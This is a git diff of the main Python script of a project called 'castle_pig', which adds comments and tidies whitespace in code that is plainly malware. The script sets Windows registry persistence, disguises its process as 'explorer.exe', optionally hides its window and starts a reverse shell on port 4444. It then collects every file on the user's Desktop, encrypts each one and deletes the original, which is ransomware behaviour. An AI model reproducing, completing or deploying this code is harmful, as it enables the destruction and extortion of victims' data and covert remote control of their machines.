@@ -6,6 +6,7 @@ import castle_pig.secure_password
 import castle_pig.keyring_password
 import castle_pig.desktop_files
 import castle_pig.reverse_shell
+# REMOVED: from castle_pig.file_encrypter import encrypt_file, get_files_from_directory, DEFAULT_PASSWORD
 
 import castle_pig.persistence
 # Add registry persistence
@@ -14,13 +15,12 @@ castle_pig.persistence.add_registry_persistence()
 import castle_pig.process_blender
 # Set the window title to mimic a legitimate process
 castle_pig.process_blender.set_process_title_windows("explorer.exe")
-# Optionally, run the script with a hidden window (uncomment to use)
+# Uncomment below to run in a hidden window
 # castle_pig.process_blender.run_hidden_windows()
 
 
-# .env loadenv file is populated 
-# Uncomment below to use and clean up unneeded code
-
+# .env loadenv file is populated
+# Uncomment below to use and clean up any unneeded code
 """
 import os
 from dotenv import load_dotenv
@@ -65,10 +65,6 @@ else:
     REVERSE_SHELL_PORT = int(REVERSE_SHELL_PORT)
 """
 
-
-
-
-
 # === Configuration ===
 SERVICE_NAME = "CastlePig"
 USERNAME = "one_dumb_pig"
@@ -78,7 +74,7 @@ REVERSE_SHELL_IP = "127.0.0.1"
 REVERSE_SHELL_PORT = 4444
 
 # Get all files from the user's Desktop (recursively)
-files = castle_pig.desktop_files.get_all_files_from_desktop()
+files = castle_pig.desktop_files.get_all_files_from_desktop() # Assuming this is in desktop_files
 
 def main():
     # 0. Optionally run reverse shell
@@ -106,10 +102,11 @@ def main():
     # 3. Encrypt each file in the files list
     os.makedirs(ENCRYPTED_FOLDER, exist_ok=True)
     for _file in files:
+        # Use the full path here
         encrypted_path = castle_pig.file_encrypter.encrypt_file(
             _file,
             password=password,
-            delete_original=True,
+            delete_original=True, # This is where you enable secure deletion
             move_to_folder=ENCRYPTED_FOLDER
         )
         if encrypted_path:
